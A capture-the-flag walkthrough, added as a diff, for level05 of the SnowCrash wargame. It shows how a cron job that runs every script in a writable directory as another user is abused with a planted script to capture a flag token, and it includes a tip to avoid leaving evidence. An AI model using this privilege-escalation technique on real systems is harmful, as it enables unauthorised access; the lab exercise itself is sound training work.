@@ -1,0 +1,58 @@
+# We do an ls -la and see that we have nothing worth while to work with.
+# From past expericence we will look for a file or name to do with level05
+# We can use the command 
+
+	find / -iname "level05"
+
+# But we find it gives alot of useless information so like we did in level00
+# We will compress it to only files that we have permission for with the below command
+
+level04@SnowCrash:~$ find / -iname "level05" 2>/dev/null
+/var/mail/level05
+/rofs/var/mail/level05
+
+# as we see in the above information we now know where to go.
+# When we cat the file we get
+
+level04@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+# Doing some extensive research, you will find out that this is a cron task. see links below
+#	We will assume that this cron task is in use 
+#	We are not able to test this with `crontab -l -u flag05`
+#	because we have no rights to see this user crontab
+
+# */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 Take note of the "2" it is in the minutes section
+#	We can see that the cron task runs the script /usr/sbin/openarenaserver 
+#	which is executed by flag05 every 2 minutes.
+
+# Now lets see what is in it
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+# Okay from what we can see from this script execute into /opt/openarenaserver/ and deletes it self right after.
+#	We have to stop or more say pause the file from being deleted. We will use the same knowledge learnt form level03
+#		Using the echo exploit. 
+#	Remember /tmp is your friend here as we have rights in this folder and we don't want to leave evidence when we log off.
+
+`echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 125 && cat /tmp/flag && echo -ne '\a'` 
+
+-# echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe	##	This will put a flag file into the /opt/openarenaserver 
+-# 	sleep 125 												##	It will sleep for 125 seconds (2mins and 5seconds)
+-#	cat /tmp/flag											##	print it 
+-#	echo -ne '\a'											##	this will remove the newline added and  '\a' notify with a bell tone 
+
+level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 125 && cat /tmp/flag && echo -ne '\a'
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+Useful links used
+https://www.digitalocean.com/community/tutorials/how-to-use-find-and-locate-to-search-for-files-on-a-linux-vps
+https://en.wikipedia.org/wiki/Cron
+http://www.unixgeeks.org/security/newbie/unix/cron-1.html
+https://ss64.com/bash/echo.html
